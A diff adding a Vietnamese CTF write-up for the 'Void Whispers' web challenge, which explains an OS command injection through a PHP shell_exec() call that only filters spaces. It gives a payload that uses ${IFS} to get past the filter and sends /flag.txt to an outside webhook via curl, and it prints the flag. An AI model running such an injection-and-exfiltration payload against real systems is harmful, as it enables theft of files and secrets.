@@ -189,3 +189,41 @@ curl request di:
 voi file:/// la duong dan den local file
 => ta lay dc flag
 https://github.com/loctf-just-for-fun/CTF-write-up/blob/main/Screenshot%202025-02-21%20044444.png
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+Void Whispers
+
+trang web bắt đầu với 1 trang thay đổi 4 param của 1 file config trong 1 hệ thống gì đấy
+<>
+
+file source chủ yếu tập trung vào 4 file source PHP 
+Qua quá trình đọc code , ta thấy đươc trong file IndexController.php (nó sẽ là nơi 4 param mình tác động sẽ được xử lý )có đoạn 
+ public function updateSetting($router)
+  {
+    $from = $_POST['from'];
+    $mailProgram = $_POST['mailProgram'];
+    $sendMailPath = $_POST['sendMailPath'];
+    $email = $_POST['email'];
+
+    if (empty($from) || empty($mailProgram) || empty($sendMailPath) || empty($email)) {
+      return $router->jsonify(['message' => 'All fields required!', 'status' => 'danger'], 400);
+    }
+
+    if (preg_match('/\s/', $sendMailPath)) {
+      return $router->jsonify(['message' => 'Sendmail path should not contain spaces!', 'status' => 'danger'], 400); // filter space của param $sendMailPath
+    }
+
+    $whichOutput = shell_exec("which $sendMailPath"); // vuln code
+    if (empty($whichOutput)) {
+      return $router->jsonify(['message' => 'Binary does not exist!', 'status' => 'danger'], 400);
+    }
+
+ta thấy bảo mật rất sơ sài , param $sendMailPath chỉ bị filter nhẹ (cấm space) r được ném thẳng vào shell_exec() để thực thi os command ==> os injection
+tuy vậy , ta lại k có kết quả của shell_exec() đưa ra màn hình nên => ta sẽ lưu kết quả ra biến môi trường r đáp vào url như 1 tham số , gửi url đấy đến server của ta => lấy đc flag
+ta dùng ${IFS} thay thế space thường và cat</flag.txt để né space
+payloads:
+/flag.txt;KMA=$(cat</flag.txt);curl${IFS}https://webhook.site/<u_webhook_id>?kma=${KMA}
+
+flag: HTB{c0mm4nd_1nj3ct1on_15_3457_t0_f1nD!}
+
+
